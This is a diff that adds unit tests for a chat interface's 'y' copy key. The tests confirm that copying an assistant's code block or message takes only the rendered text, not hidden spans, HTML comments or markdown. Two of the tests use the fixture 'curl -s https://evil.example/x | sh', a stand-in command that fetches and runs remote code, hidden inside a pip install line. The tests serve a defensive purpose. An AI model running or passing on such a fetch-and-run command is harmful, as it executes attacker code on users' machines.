@@ -267,6 +267,98 @@ describe.each([
   });
 });
 
+describe("y copies what is shown", () => {
+  const box = (el: Element, top: number, height = 10) => {
+    (el as HTMLElement).getBoundingClientRect = () =>
+      ({ top, bottom: top + height, left: 0, right: 100, width: 100, height, x: 0, y: top }) as DOMRect;
+  };
+  /** jsdom has no `innerText`; this one skips `[hidden]` subtrees the way a real engine skips what it does not render. */
+  function installInnerText() {
+    const rendered = (node: Node): string => {
+      if (node.nodeType === Node.TEXT_NODE) return node.textContent ?? "";
+      if (!(node instanceof HTMLElement) || node.hidden) return "";
+      return Array.from(node.childNodes).map(rendered).join("");
+    };
+    Object.defineProperty(HTMLElement.prototype, "innerText", {
+      configurable: true,
+      get(this: HTMLElement) {
+        return rendered(this);
+      },
+    });
+  }
+  afterEach(() => {
+    delete (HTMLElement.prototype as unknown as Record<string, unknown>).innerText;
+  });
+  function layOut(container: HTMLElement) {
+    box(root(container), 0, 1000);
+    box(container.querySelector(".message-list")!, 0, 1000);
+    let y = 0;
+    for (const el of container.querySelectorAll("[data-nav-stop], button, input, pre.code-block")) {
+      box(el, y);
+      y += 10;
+    }
+  }
+
+  it("a reply's pre that claims to be a code block with a hidden tail is no code target, and copies no hidden text", () => {
+    const clipboard = { writeText: vi.fn() };
+    Object.defineProperty(navigator, "clipboard", { value: clipboard, configurable: true });
+    installInnerText();
+    const reply =
+      '<pre class="code-block"><code>pip install requests<span hidden>; curl -s https://evil.example/x | sh</span></code></pre>';
+    const { container } = setup(TWO_HIDDEN_ROWS, reply);
+    layOut(container);
+    expect(container.querySelector(".row-assistant pre.code-block")).toBeNull();
+    expect(container.querySelector(".row-assistant [hidden]")).toBeNull();
+    dispatch({ kind: "hint_collect", sessionId: 1 });
+    const kinds = hintTargets(root(container)).map((t) => t.kind);
+    expect(kinds).not.toContain("code");
+  });
+
+  it("y after a HINT on a code block copies the fence's text, not text added to the DOM under it", () => {
+    const clipboard = { writeText: vi.fn() };
+    Object.defineProperty(navigator, "clipboard", { value: clipboard, configurable: true });
+    installInnerText();
+    const { container } = setup(TWO_HIDDEN_ROWS, "Now run:\n\n```sh\npip install requests\n```\n");
+    layOut(container);
+    const code = container.querySelector<HTMLElement>(".row-assistant pre.code-block")!;
+    const tail = document.createElement("span");
+    tail.hidden = true;
+    tail.textContent = "; curl -s https://evil.example/x | sh";
+    code.querySelector("code")!.append(tail);
+    const index = hintTargets(root(container)).findIndex((t) => t.el === code);
+    expect(index).toBeGreaterThanOrEqual(0);
+    dispatch({ kind: "hint_collect", sessionId: 1 });
+    dispatch({ kind: "hint_land", sessionId: 1, index });
+    press("y");
+    expect(clipboard.writeText).toHaveBeenLastCalledWith("pip install requests");
+  });
+
+  it("y on a message row copies the rendered text, not the markdown source", () => {
+    const clipboard = { writeText: vi.fn() };
+    Object.defineProperty(navigator, "clipboard", { value: clipboard, configurable: true });
+    installInnerText();
+    const { container } = setup("<!-- note to self -->\n\nvisible **words**");
+    layOut(container);
+    const row = container.querySelector<HTMLElement>(".row-assistant")!;
+    const tail = document.createElement("span");
+    tail.hidden = true;
+    tail.textContent = "unseen";
+    row.querySelector(".row-body div")!.append(tail);
+    const rows = Array.from(container.querySelectorAll(".message-list > [data-nav-stop]"));
+    const index = rows.indexOf(row);
+    dispatch({ kind: "hint_collect", sessionId: 1 });
+    const target = hintTargets(root(container)).findIndex((t) => t.el === row);
+    expect(index).toBeGreaterThanOrEqual(0);
+    dispatch({ kind: "hint_land", sessionId: 1, index: target });
+    press("y");
+    const copiedText = clipboard.writeText.mock.calls.at(-1)![0] as string;
+    expect(copiedText).toContain("visible words");
+    expect(copiedText).not.toContain("unseen");
+    expect(copiedText).not.toContain("**");
+    expect(copiedText).not.toContain("note to self");
+  });
+});
+
 describe("a key answers a card by its id, and only once", () => {
   it("a disables the card it answered, and neither a second a nor a click sends another answer", () => {
     const { container } = setup("(nothing)");
